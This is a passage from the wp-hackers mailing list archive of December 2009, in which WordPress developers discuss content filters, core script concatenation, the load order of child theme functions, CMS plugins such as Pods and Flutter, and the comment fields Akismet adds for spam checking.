	<9aa12a490912140432h43248b76jf776906ff1f4471d@mail.gmail.com>
	<349fe48b0912140800m6bf7ca82r30d767c90cce66c0@mail.gmail.com>
	<4B27B3DB.7040509@adcSTUDIO.com>
	<349fe48b0912151045i516383cam5ea881a66c82905c@mail.gmail.com>
Message-ID: <e1202cb10912181057l30a32c19w5f235e93f5884d95@mail.gmail.com>

On Tue, Dec 15, 2009 at 1:45 PM, scribu <scribu at gmail.com> wrote:
> On Tue, Dec 15, 2009 at 6:05 PM, Ken Newman <Ken at adcstudio.com> wrote:
>> You can apply the filter yourself:
>>> $filtered_content = apply_filters('the_content', get_the_post_content());
>>>
>>> ?Would it be considered good practice do this, say, in child theme's
>> function file?
>
> Yes, it doesn't matter where you're putting this code.

I think this is the right approach. I do the
apply_filters('the_content', $something) trick often to get things
like [shortcodes] to work in category descriptions, author bios etc.

It's not really Ideal as its supposed to be tied to showing post body
content, but in practice it tends to work really well. Most plugins
add their filtering to that hook so whatever you pass in gets the full
treatment in most cases.

Moving the default filters to get_the_content() seems dangerous to me,
especially for reverse compatibility. Past uses of that filter would
assume specifically that the content would NOT have paragraphs etc
added to it, which could be important for a lot of reasons. It's also
logically consistent that get_the_content() would return the
database-formatted text, there are lots of situations where that is a
valuable tool and taking care of the filtering yourself after is
reasonable if you are being that elaborate with your manipulations.

Obviously themes shouldn't mess around with $post->post_content unless
they know what they're doing. I can't help thinking that adding that
to a theme without any add_filter('the_content') must have been done
with almost no testing of its effects on posting (I've done this
before! It caused bugs cause I did almost no testing of posting!)

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From jayarjo at gmail.com  Fri Dec 18 19:24:55 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Fri, 18 Dec 2009 23:24:55 +0400
Subject: [wp-hackers] JavaScript concatenation and compression - any
	documentation?
In-Reply-To: <349fe48b0912180230o273e387flfc3943be002cc303@mail.gmail.com>
References: <9aa12a490912172358h5885abc5w724a22e84abc2724@mail.gmail.com>
	<349fe48b0912180230o273e387flfc3943be002cc303@mail.gmail.com>
Message-ID: <9aa12a490912181124i3a42d27dt7a7f0a97c1b8d62a@mail.gmail.com>

Is it turned on by default for my plugins and themes?

On Fri, Dec 18, 2009 at 2:30 PM, scribu <scribu at gmail.com> wrote:
> Compression is done offline, using YUI compressor.
>
> Concatenation is available only for scripts shipped with WP Core.
>
>
> On Fri, Dec 18, 2009 at 9:58 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:
>
>> Is there any established documentation about this feature?
>>
>> --
>> Davit Barbakadze
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From jane at automattic.com  Fri Dec 18 19:32:21 2009
From: jane at automattic.com (Jane Wells)
Date: Fri, 18 Dec 2009 14:32:21 -0500
Subject: [wp-hackers] New Default Theme
In-Reply-To: <mailman.8297.1261164308.16651.wp-hackers@lists.automattic.com>
References: <mailman.8297.1261164308.16651.wp-hackers@lists.automattic.com>
Message-ID: <DA66B672-DCDC-45E1-8243-4A0E074A8CE1@automattic.com>

Per the dev chat request yesterday, I'll announce to this list when I  
post to the dev blog about things that we'd like people to weigh in on  
over the next few weeks (summaries from the core team meetup) so we  
can start the cycle for 3.0 right away when we come back form the  
holidays in 2010. Today I posted about making a new default theme to  
bundle with 3.0. In order to make it easy for people to follow the  
discussions, for each post I'll create a forum thread. If we can all  
try to post opinions there, that would be helpful, as we really need  
to have an official place to scan the responses. Discussions on this  
mailing list are not easy to scan, so please try to use the forum  
threads for these particular topics as they come up. Thanks!
Today's post: http://wordpress.org/development/2009/12/2010-a-theme-odyssey/
The forum thread: http://wordpress.org/support/topic/342819
Jane

From wp at andrewnacin.com  Fri Dec 18 19:36:18 2009
From: wp at andrewnacin.com (Andrew Nacin)
Date: Fri, 18 Dec 2009 14:36:18 -0500
Subject: [wp-hackers] JavaScript concatenation and compression - any
	documentation?
In-Reply-To: <9aa12a490912181124i3a42d27dt7a7f0a97c1b8d62a@mail.gmail.com>
References: <9aa12a490912172358h5885abc5w724a22e84abc2724@mail.gmail.com> 
	<349fe48b0912180230o273e387flfc3943be002cc303@mail.gmail.com> 
	<9aa12a490912181124i3a42d27dt7a7f0a97c1b8d62a@mail.gmail.com>
Message-ID: <4cc4de140912181136o221d382bvbd4c35e6b0dca907@mail.gmail.com>

>
> Is it turned on by default for my plugins and themes?


No. It can't be turned on, period. Two versions of core scripts are
committed the core -- a development version, and a compressed version
created by core developers using YUI. The compressed version is used unless
a debug constant is set in wp-config.php. The core only concatenates core
scripts.

From wp at xentek.net  Fri Dec 18 21:36:20 2009
From: wp at xentek.net (Eric Marden)
Date: Fri, 18 Dec 2009 16:36:20 -0500
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
	(Jean-Patrick Smith)
In-Reply-To: <dea5cae00912171708nf040d7eke4f6a8ca09540883@mail.gmail.com>
References: <f44b36190912171528n42bf7747p6e41df7bf91bb6@mail.gmail.com>
	<dea5cae00912171708nf040d7eke4f6a8ca09540883@mail.gmail.com>
Message-ID: <CFD1BC34-FA1A-44C0-AE05-8D3D14B97162@xentek.net>

On Dec 17, 2009, at 8:08 PM, Dave R wrote:

> Tell me, would you rate PodsCMS above Flutter? Used Flutter recently  
> for the
> first time, found good and bad, so curious for next major project.


I wouldn't personally recommend either plugin, for a variety of  
reasons, but specifically because they break with the WP Core  
architecture in significant ways.


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From wp at xentek.net  Fri Dec 18 21:39:11 2009
From: wp at xentek.net (Eric Marden)
Date: Fri, 18 Dec 2009 16:39:11 -0500
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
In-Reply-To: <71ddd7490912172108m3b6ef3e1xce667d06a7f5bdb9@mail.gmail.com>
References: <1261068387.8378.85.camel@buna> <4B2A6B10.6060201@adcSTUDIO.com>
	<e4dc67e0912171219x7183a3fagfcb5d1cbd3a820d@mail.gmail.com>
	<e1202cb10912171649g2171781eg6311e69749851427@mail.gmail.com>
	<467D3C79-CB2B-4069-A3D0-8908D9DAFFD7@striderweb.com>
	<71ddd7490912172108m3b6ef3e1xce667d06a7f5bdb9@mail.gmail.com>
Message-ID: <7C15CA07-E472-4FC1-A555-4253B0E9F71F@xentek.net>


On Dec 18, 2009, at 12:08 AM, Doug Stewart wrote:

> Open Atrium (http://openatrium.com/)
> wherein a custom workflow outside the general need/use case is
> accommodated/tailored-to in order to make a software distro  
> immediately more
> useful to a subset of people.


Open Atrium is basically a set of Drupal Modules + Custom Theme, and  
that kind of project (think BuddyPress) is easy to create with/for  
WordPress that doesn't require a fork.

- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From jayarjo at gmail.com  Fri Dec 18 21:43:53 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sat, 19 Dec 2009 01:43:53 +0400
Subject: [wp-hackers] JavaScript concatenation and compression - any
	documentation?
In-Reply-To: <4cc4de140912181136o221d382bvbd4c35e6b0dca907@mail.gmail.com>
References: <9aa12a490912172358h5885abc5w724a22e84abc2724@mail.gmail.com>
	<349fe48b0912180230o273e387flfc3943be002cc303@mail.gmail.com>
	<9aa12a490912181124i3a42d27dt7a7f0a97c1b8d62a@mail.gmail.com>
	<4cc4de140912181136o221d382bvbd4c35e6b0dca907@mail.gmail.com>
Message-ID: <9aa12a490912181343s5fa4bb04t534299f1de96396c@mail.gmail.com>

What does it mean it can't be turned on? I've been asking whether
concatenation is already turned on (for only core scripts) by default?

On Fri, Dec 18, 2009 at 11:36 PM, Andrew Nacin <wp at andrewnacin.com> wrote:
>>
>> Is it turned on by default for my plugins and themes?
>
>
> No. It can't be turned on, period. Two versions of core scripts are
> committed the core -- a development version, and a compressed version
> created by core developers using YUI. The compressed version is used unless
> a debug constant is set in wp-config.php. The core only concatenates core
> scripts.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From Ken at adcSTUDIO.com  Fri Dec 18 21:49:18 2009
From: Ken at adcSTUDIO.com (Ken Newman)
Date: Fri, 18 Dec 2009 16:49:18 -0500
Subject: [wp-hackers] JavaScript concatenation and compression -
	any	documentation?
In-Reply-To: <9aa12a490912181343s5fa4bb04t534299f1de96396c@mail.gmail.com>
References: <9aa12a490912172358h5885abc5w724a22e84abc2724@mail.gmail.com>	<349fe48b0912180230o273e387flfc3943be002cc303@mail.gmail.com>	<9aa12a490912181124i3a42d27dt7a7f0a97c1b8d62a@mail.gmail.com>	<4cc4de140912181136o221d382bvbd4c35e6b0dca907@mail.gmail.com>
	<9aa12a490912181343s5fa4bb04t534299f1de96396c@mail.gmail.com>
Message-ID: <4B2BF8DE.5020303@adcSTUDIO.com>

"Concatenation is available only for scripts shipped with WP Core."

It not turned on by default for your plugins and themes.
It's not available for your plugin or theme scripts either.

You can use the core scripts that are concatenated, but your scripts 
will not be concatenated with those scripts or automatically 
concatenated with themselves.

On 12/18/2009 4:43 PM, Davit Barbakadze wrote:
> What does it mean it can't be turned on? I've been asking whether
> concatenation is already turned on (for only core scripts) by default?
>
> On Fri, Dec 18, 2009 at 11:36 PM, Andrew Nacin<wp at andrewnacin.com>  wrote:
>    
>>> Is it turned on by default for my plugins and themes?
>>>        
>>
>> No. It can't be turned on, period. Two versions of core scripts are
>> committed the core -- a development version, and a compressed version
>> created by core developers using YUI. The compressed version is used unless
>> a debug constant is set in wp-config.php. The core only concatenates core
>> scripts.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>      
>
>
>    


From Ken at adcSTUDIO.com  Fri Dec 18 21:54:20 2009
From: Ken at adcSTUDIO.com (Ken Newman)
Date: Fri, 18 Dec 2009 16:54:20 -0500
Subject: [wp-hackers] JavaScript concatenation and compression -
	any	documentation?
In-Reply-To: <9aa12a490912181343s5fa4bb04t534299f1de96396c@mail.gmail.com>
References: <9aa12a490912172358h5885abc5w724a22e84abc2724@mail.gmail.com>	<349fe48b0912180230o273e387flfc3943be002cc303@mail.gmail.com>	<9aa12a490912181124i3a42d27dt7a7f0a97c1b8d62a@mail.gmail.com>	<4cc4de140912181136o221d382bvbd4c35e6b0dca907@mail.gmail.com>
	<9aa12a490912181343s5fa4bb04t534299f1de96396c@mail.gmail.com>
Message-ID: <4B2BFA0C.2080804@adcSTUDIO.com>

See this post for more information: 
http://wpdevel.wordpress.com/2009/02/06/script-loader-updates/

Specifically:
"Another major new feature is that all core admin scripts are 
concatenated and compressed before sending them to the browser. This 
feature can easily be extended to include scripts added by plugins and 
to use server side caching, however that would require some changes to 
the server settings (.htaccess on Apache).

Since compression from php can be problematic on some hosts there are 
several "switches" (constants) that manage it: 
|define('CONCATENATE_SCRIPTS', false);| would turn off both 
concatenating and compressing of all scripts."

hope that's more helpful ;)

On 12/18/2009 4:43 PM, Davit Barbakadze wrote:
> What does it mean it can't be turned on? I've been asking whether
> concatenation is already turned on (for only core scripts) by default?
>
> On Fri, Dec 18, 2009 at 11:36 PM, Andrew Nacin<wp at andrewnacin.com>  wrote:
>    
>>> Is it turned on by default for my plugins and themes?
>>>        
>>
>> No. It can't be turned on, period. Two versions of core scripts are
>> committed the core -- a development version, and a compressed version
>> created by core developers using YUI. The compressed version is used unless
>> a debug constant is set in wp-config.php. The core only concatenates core
>> scripts.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>      
>
>
>    


From wp at xentek.net  Fri Dec 18 21:57:56 2009
From: wp at xentek.net (Eric Marden)
Date: Fri, 18 Dec 2009 16:57:56 -0500
Subject: [wp-hackers] JavaScript concatenation and compression - any
	documentation?
In-Reply-To: <9aa12a490912181343s5fa4bb04t534299f1de96396c@mail.gmail.com>
References: <9aa12a490912172358h5885abc5w724a22e84abc2724@mail.gmail.com>
	<349fe48b0912180230o273e387flfc3943be002cc303@mail.gmail.com>
	<9aa12a490912181124i3a42d27dt7a7f0a97c1b8d62a@mail.gmail.com>
	<4cc4de140912181136o221d382bvbd4c35e6b0dca907@mail.gmail.com>
	<9aa12a490912181343s5fa4bb04t534299f1de96396c@mail.gmail.com>
Message-ID: <107B88EA-229D-4D27-AB00-0EA847ABD639@xentek.net>

>>> Is it turned on by default for my plugins and themes?
>> No. It can't be turned on, period.

> What does it mean it can't be turned on? I've been asking whether
> concatenation is already turned on (for only core scripts) by default?

Davit, Andrew was answering your question. Its turned on for the core  
scripts by default, but doesn't do anything for plugins or themes.



- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From kikizas at gmail.com  Fri Dec 18 22:36:18 2009
From: kikizas at gmail.com (Demetris)
Date: Sat, 19 Dec 2009 00:36:18 +0200
Subject: [wp-hackers] Child theme functions.php & processing order
In-Reply-To: <161617690912110602o408d2737p2cee350eec93c788@mail.gmail.com>
References: <58E76AA1-8AD3-4880-904B-9C007D106F96@gmail.com>
	<9f34a3610912101836l1d5aa80dnb150d23660292bf7@mail.gmail.com>
	<161617690912110602o408d2737p2cee350eec93c788@mail.gmail.com>
Message-ID: <9f34a3610912181436i7e8fa10tc48631b68c153461@mail.gmail.com>

On Fri, Dec 11, 2009 at 4:02 PM, Otto <otto at ottodestruct.com> wrote:
> On Thu, Dec 10, 2009 at 8:36 PM, Demetris <kikizas at gmail.com> wrote:
>> The child?s functions.php is executed first.
>>
>> I would expect it to be the other way around. ?(But I have no idea if
>> it matters. For example, when both parent and child register one
>> function or filter each to the same hook, the order can be adapted
>> with the priority argument. But probably there are scenarios that I?m
>> missing.)
>
> The child is executed first, to allow the child to override the
> parent. Think "pluggable".
>
> Consider this case:
>
> Parent functions.php
>
> if (!function_exists('some_function')) :
> function some_function() {
> ...
> }
> endif;
>
> Child can now override that function merely by declaring it himself,
> but only as long as he's included first.
>
Thanks, Otto!  I hadn?t thought of that -- obviously!

I?ll have to try it now.

Cheers!

Demetris
http://op111.net/

From mikeschinkel at newclarity.net  Fri Dec 18 23:15:01 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 18 Dec 2009 18:15:01 -0500
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
	(Jean-Patrick Smith)
In-Reply-To: <CFD1BC34-FA1A-44C0-AE05-8D3D14B97162@xentek.net>
References: <f44b36190912171528n42bf7747p6e41df7bf91bb6@mail.gmail.com>
	<dea5cae00912171708nf040d7eke4f6a8ca09540883@mail.gmail.com>
	<CFD1BC34-FA1A-44C0-AE05-8D3D14B97162@xentek.net>
Message-ID: <2F87CEFC-E325-4CBD-BD0F-FF9B51AA7E8C@newclarity.net>

On Dec 18, 2009, at 4:36 PM, Eric Marden wrote:
> On Dec 17, 2009, at 8:08 PM, Dave R wrote:
>> Tell me, would you rate PodsCMS above Flutter? Used Flutter recently for the
>> first time, found good and bad, so curious for next major project.
> 
> I wouldn't personally recommend either plugin, for a variety of reasons, but specifically because they break with the WP Core architecture in significant ways.

Interesting. In your opinion how would a plugin have to implement the functionality of Pods/Flutter while still maintaining the WP Core architecture? (this is an honest question, not a baited one.)

-Mike



From dave69 at gmail.com  Fri Dec 18 23:21:30 2009
From: dave69 at gmail.com (Dave R)
Date: Sat, 19 Dec 2009 10:21:30 +1100
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
	(Jean-Patrick Smith)
In-Reply-To: <2F87CEFC-E325-4CBD-BD0F-FF9B51AA7E8C@newclarity.net>
References: <f44b36190912171528n42bf7747p6e41df7bf91bb6@mail.gmail.com> 
	<dea5cae00912171708nf040d7eke4f6a8ca09540883@mail.gmail.com> 
	<CFD1BC34-FA1A-44C0-AE05-8D3D14B97162@xentek.net>
	<2F87CEFC-E325-4CBD-BD0F-FF9B51AA7E8C@newclarity.net>
Message-ID: <dea5cae00912181521w205fec41na6e1066ddd73011d@mail.gmail.com>

Indeed interesting, as those plugins add functionality that is one of the
glaring ommissions from WP truly being a CMS rather than a blog platform,
plus you've dismissed them without offering an alternative solution. Custom
Fields in my opinion while part of the core architecture are more of a
"hack" functionality wise for aiming to provide true CMS capabilities.

So what's better: Core architecture but inadequate functionality for a true
CMS.

Or "breaking" core architecture but delivering true CMS capabilities?

Worthy of discussion me thinks.

Plus, do plugins by their very nature "break" the core architecture on most
occasions?

Cheers,
Dave



2009/12/19 Mike Schinkel <mikeschinkel at newclarity.net>

> On Dec 18, 2009, at 4:36 PM, Eric Marden wrote:
> > On Dec 17, 2009, at 8:08 PM, Dave R wrote:
> >> Tell me, would you rate PodsCMS above Flutter? Used Flutter recently for
> the
> >> first time, found good and bad, so curious for next major project.
> >
> > I wouldn't personally recommend either plugin, for a variety of reasons,
> but specifically because they break with the WP Core architecture in
> significant ways.
>
> Interesting. In your opinion how would a plugin have to implement the
> functionality of Pods/Flutter while still maintaining the WP Core
> architecture? (this is an honest question, not a baited one.)
>
> -Mike
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at xentek.net  Sat Dec 19 00:29:17 2009
From: wp at xentek.net (Eric Marden)
Date: Fri, 18 Dec 2009 19:29:17 -0500
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
	(Jean-Patrick Smith)
In-Reply-To: <dea5cae00912181521w205fec41na6e1066ddd73011d@mail.gmail.com>
References: <f44b36190912171528n42bf7747p6e41df7bf91bb6@mail.gmail.com>
	<dea5cae00912171708nf040d7eke4f6a8ca09540883@mail.gmail.com>
	<CFD1BC34-FA1A-44C0-AE05-8D3D14B97162@xentek.net>
	<2F87CEFC-E325-4CBD-BD0F-FF9B51AA7E8C@newclarity.net>
	<dea5cae00912181521w205fec41na6e1066ddd73011d@mail.gmail.com>
Message-ID: <0704BA6F-9BF7-4E61-B692-B2F10C0BC68E@xentek.net>

On Dec 18, 2009, at 6:21 PM, Dave R wrote:

> So what's better: Core architecture but inadequate functionality for  
> a true
> CMS.
>
> Or "breaking" core architecture but delivering true CMS capabilities?
>
> Worthy of discussion me thinks.

If you want Drupal-like functionality, then just use Drupal. I  
personally don't want or need a GUI to create "CMS" functionality in  
WordPress - I can exploit the existing APIs to create all the custom  
post types I need. In fact I said as much when I spoke about this at  
WordCamp Orlando. Having built or worked on some of the biggest Drupal  
sites on the planet, I can attest to the flaws in that type of  
architecture for performance and manageable development. WordPress's  
custom post type APIs are still evolving and will be getting much  
better in the future, but they are still plenty capable in my opinion  
with out boxing in the types of solutions I can create with them.

Either way, use Pods or Flutter if it floats your boat, but after  
using both of them on a couple of projects I can tell you that in my  
professional opinion its a rabbit hole I don't want to go down again.  
This debate already raged on the list before, and I don't mean to fan  
this flame any further. Just don't expect a lot of traction for any  
kind of Drupal-like CCK/Views/Panels/Blocks in core anytime soon.


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From mikeschinkel at newclarity.net  Sat Dec 19 00:48:15 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 18 Dec 2009 19:48:15 -0500
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
	(Jean-Patrick Smith)
In-Reply-To: <0704BA6F-9BF7-4E61-B692-B2F10C0BC68E@xentek.net>
References: <f44b36190912171528n42bf7747p6e41df7bf91bb6@mail.gmail.com>
	<dea5cae00912171708nf040d7eke4f6a8ca09540883@mail.gmail.com>
	<CFD1BC34-FA1A-44C0-AE05-8D3D14B97162@xentek.net>
	<2F87CEFC-E325-4CBD-BD0F-FF9B51AA7E8C@newclarity.net>
	<dea5cae00912181521w205fec41na6e1066ddd73011d@mail.gmail.com>
	<0704BA6F-9BF7-4E61-B692-B2F10C0BC68E@xentek.net>
Message-ID: <6930227A-8F13-4664-BA31-EAD3FA8880D6@newclarity.net>

On Dec 18, 2009, at 7:29 PM, Eric Marden wrote:
> If you want Drupal-like functionality, then just use Drupal.

I'm so incredibly tired of that refrain.  I thought you might come back from something that identified a solution, but instead you repeated that tired old saw.

Let's just put it out there: Drupal SUCKS (and this from someone who used Drupal exclusively for >1.5 years, as I have said before!)  I don't want to use Drupal, please don't tell me to use Drupal. I want to use WordPress.

> I personally don't want or need a GUI to create "CMS" functionality in WordPress - I can exploit the existing APIs to create all the custom post types I need. In fact I said as much when I spoke about this at WordCamp Orlando.

Just because you don't need or want doesn't mean that many others should be blocked from getting it.  To each his own.

> Having built or worked on some of the biggest Drupal sites on the planet, I can attest to the flaws in that type of architecture for performance and manageable development.

Neither Pods nor Flutter introduce into WordPress the architecture flaws that Drupal has.  And to be clear, Drupal's "flaw" appear at first to be benefits, at least until you use it for a while and learn that it just doesn't work well.

> WordPress's custom post type APIs are still evolving and will be getting much better in the future, but they are still plenty capable in my opinion with out boxing in the types of solutions I can create with them.

How do Pods or Flutter "box you in?"

> Either way, use Pods or Flutter if it floats your boat, but after using both of them on a couple of projects I can tell you that in my professional opinion its a rabbit hole I don't want to go down again.

Can you give more details?  Seriously, I want to know what you see wrong with them because I know you have experience with them.  I'm working on a plugin that was going to be synergistic with them in concept but it there's a better way maybe I'll implement that instead.

> This debate already raged on the list before, and I don't mean to fan this flame any further.

Heh.

> Just don't expect a lot of traction for any kind of Drupal-like CCK/Views/Panels/Blocks in core anytime soon.

Pods is CCK (only), Flutter is none of the above.

IMO, WordPress badly needs its own CCK; the rest of them, not so much.

-Mike



> On Dec 18, 2009, at 6:21 PM, Dave R wrote:
> 
>> So what's better: Core architecture but inadequate functionality for a true
>> CMS.
>> 
>> Or "breaking" core architecture but delivering true CMS capabilities?
>> 
>> Worthy of discussion me thinks.
> 
> If you want Drupal-like functionality, then just use Drupal. I personally don't want or need a GUI to create "CMS" functionality in WordPress - I can exploit the existing APIs to create all the custom post types I need. In fact I said as much when I spoke about this at WordCamp Orlando. Having built or worked on some of the biggest Drupal sites on the planet, I can attest to the flaws in that type of architecture for performance and manageable development. WordPress's custom post type APIs are still evolving and will be getting much better in the future, but they are still plenty capable in my opinion with out boxing in the types of solutions I can create with them.
> 
> Either way, use Pods or Flutter if it floats your boat, but after using both of them on a couple of projects I can tell you that in my professional opinion its a rabbit hole I don't want to go down again. This debate already raged on the list before, and I don't mean to fan this flame any further. Just don't expect a lot of traction for any kind of Drupal-like CCK/Views/Panels/Blocks in core anytime soon.
> 
> 
> - Eric Marden
> __________________________________
> http://xentek.net/code/wordpress/
> tw: @xentek
> 
> 
> 
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From chicagowebdev at gmail.com  Sat Dec 19 02:44:18 2009
From: chicagowebdev at gmail.com (Jean-Patrick Smith)
Date: Fri, 18 Dec 2009 20:44:18 -0600
Subject: [wp-hackers] Wordpress as a CMS
Message-ID: <f44b36190912181844q2f2a0582la80c153413b1f3ec@mail.gmail.com>

>
> > Tell me, would you rate PodsCMS above Flutter? Used Flutter recently
> > for the
> > first time, found good and bad, so curious for next major project.
>

PodsCMS is definately better because it doesn't use the post_meta table. For
content type you create, it creates a new table based on the attributes
you've specified when setting it up.

http://wordpress.tv/2009/10/30/pods-cms-basics/


I wouldn't personally recommend either plugin, for a variety of
> reasons, but specifically because they break with the WP Core
> architecture in significant ways.
>
>
> - Eric Marden (Jean-Patrick Smith)
>

They don't break the core directly, it's just a cms that uses the wordpress
admin basically. And some wordpress functions, but as Mike said below, how
would you achieve it otherwise?

Wordpress as a CMS is only feasible if you do it the PodsCMS way, you can't
really scale well using the other CMS plugins that just make
editing/displaying meta values easier.


Interesting. In your opinion how would a plugin have to impement the
> functionality of Pods/Flutter while still maintaining the WP Core
> architecture? (this is an honest question, not a baited one.)
>
> -Mike
>

You can only do it those two ways. I guess you could make it text based and
save your generated files to the filesystem... but that's about it:

   1. Store everything in custom created tables like podscms
   2. Store everything in the posts_meta table
   3. Create or implement a templating language and save generated files and
   settings to the filesystem

From peter at avirtualhome.com  Sat Dec 19 04:31:56 2009
From: peter at avirtualhome.com (Peter van der Does)
Date: Fri, 18 Dec 2009 23:31:56 -0500
Subject: [wp-hackers] Why is Akismet returning more info in the $commentdata
	?
Message-ID: <20091218233156.03591ec4@montecarlo.grandprix.int>

Akismet is adding several fields to commentdata during the
preprocess_comment filter. The function called is
akismet_auto_check_comment.

The following fields are added:

$comment['user_ip']    = preg_replace( '/[^0-9., ]/', '', $_SERVER['REMOTE_ADDR'] );
$comment['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
$comment['referrer']   = $_SERVER['HTTP_REFERER'];
$comment['blog']       = get_option('home');
$comment['blog_lang']  = get_locale();
$comment['blog_charset'] = get_option('blog_charset');
$comment['permalink']  = get_permalink($comment['comment_post_ID']);


Why is this?

-- 
Peter van der Does

GPG key: E77E8E98

IRC: Ganseki on irc.freenode.net
Twitter: @petervanderdoes

WordPress Plugin Developer
Blog: http://blog.avirtualhome.com
Forums: http://forums.avirtualhome.com
Twitter: @avhsoftware

From zamoose at gmail.com  Sat Dec 19 05:06:04 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Sat, 19 Dec 2009 00:06:04 -0500
Subject: [wp-hackers] Why is Akismet returning more info in the
	$commentdata ?
In-Reply-To: <20091218233156.03591ec4@montecarlo.grandprix.int>
References: <20091218233156.03591ec4@montecarlo.grandprix.int>
Message-ID: <71ddd7490912182106m400390bfo4305a7025158d46@mail.gmail.com>

On Fri, Dec 18, 2009 at 11:31 PM, Peter van der Does <peter at avirtualhome.com
> wrote:

> Akismet is adding several fields to commentdata during the
> preprocess_comment filter. The function called is
> akismet_auto_check_comment.
>
> The following fields are added:
>
> $comment['user_ip']    = preg_replace( '/[^0-9., ]/', '',
> $_SERVER['REMOTE_ADDR'] );
> $comment['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
> $comment['referrer']   = $_SERVER['HTTP_REFERER'];
> $comment['blog']       = get_option('home');
> $comment['blog_lang']  = get_locale();
> $comment['blog_charset'] = get_option('blog_charset');
> $comment['permalink']  = get_permalink($comment['comment_post_ID']);
>
>
> Why is this?
>
>
...Because all those pieces of information are useful in determining
potential spam?

If someone is leaving Cyrillic-encoded comments on a blog using the English
(US) locale, there's a good chance it's spam, for instance.

At least that's my read on it.  Each of those pieces of info could be quite
useful in determining in a heuristic/holistic fashion the chance that a
spammer is doing the commenting.

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From peter at avirtualhome.com  Sat Dec 19 05:24:24 2009
From: peter at avirtualhome.com (Peter van der Does)
Date: Sat, 19 Dec 2009 00:24:24 -0500
Subject: [wp-hackers] Why is Akismet returning more info in the
 $commentdata ?
In-Reply-To: <71ddd7490912182106m400390bfo4305a7025158d46@mail.gmail.com>
References: <20091218233156.03591ec4@montecarlo.grandprix.int>
	<71ddd7490912182106m400390bfo4305a7025158d46@mail.gmail.com>
Message-ID: <20091219002424.6e0631de@montecarlo.grandprix.int>

On Sat, 19 Dec 2009 00:06:04 -0500
Doug Stewart <zamoose at gmail.com> wrote:

> On Fri, Dec 18, 2009 at 11:31 PM, Peter van der Does
> <peter at avirtualhome.com
> > wrote:
> 
> > Akismet is adding several fields to commentdata during the
> > preprocess_comment filter. The function called is
> > akismet_auto_check_comment.
> >
> > The following fields are added:
> >
> > $comment['user_ip']    = preg_replace( '/[^0-9., ]/', '',
> > $_SERVER['REMOTE_ADDR'] );
> > $comment['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
> > $comment['referrer']   = $_SERVER['HTTP_REFERER'];
> > $comment['blog']       = get_option('home');
> > $comment['blog_lang']  = get_locale();
> > $comment['blog_charset'] = get_option('blog_charset');
> > $comment['permalink']  = get_permalink($comment['comment_post_ID']);
> >
> >
> > Why is this?
> >
> >
> ...Because all those pieces of information are useful in determining
> potential spam?
> 
> If someone is leaving Cyrillic-encoded comments on a blog using the
> English (US) locale, there's a good chance it's spam, for instance.
> 
> At least that's my read on it.  Each of those pieces of info could be
> quite useful in determining in a heuristic/holistic fashion the
> chance that a spammer is doing the commenting.
> 

But why are the returned into WordPress?
The next function called with the preprocess_comment filter inherits
all these fields as well.
It just seems unnecessary.

-- 
Peter van der Does

GPG key: E77E8E98

IRC: Ganseki on irc.freenode.net
Twitter: @petervanderdoes

WordPress Plugin Developer
Blog: http://blog.avirtualhome.com
Forums: http://forums.avirtualhome.com
Twitter: @avhsoftware

From lists.automattic.com at callum-macdonald.com  Sat Dec 19 05:27:37 2009
From: lists.automattic.com at callum-macdonald.com (Callum Macdonald)
Date: Fri, 18 Dec 2009 23:27:37 -0600
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
In-Reply-To: <427667db0912180021t13da8b63q87e91f87cceb3b4b@mail.gmail.com>
References: <1261068387.8378.85.camel@buna> <4B2A6B10.6060201@adcSTUDIO.com>
	<e4dc67e0912171219x7183a3fagfcb5d1cbd3a820d@mail.gmail.com>
	<e1202cb10912171649g2171781eg6311e69749851427@mail.gmail.com>
	<467D3C79-CB2B-4069-A3D0-8908D9DAFFD7@striderweb.com>
	<71ddd7490912172108m3b6ef3e1xce667d06a7f5bdb9@mail.gmail.com>
	<1261115493.4549.23.camel@buna>
	<427667db0912180021t13da8b63q87e91f87cceb3b4b@mail.gmail.com>
Message-ID: <1261200457.4549.255.camel@buna>

On Fri, 2009-12-18 at 21:21 +1300, Lynne Pope wrote:
> I've been maintaining a private "fork" of WordPress since 2.6.5 because the
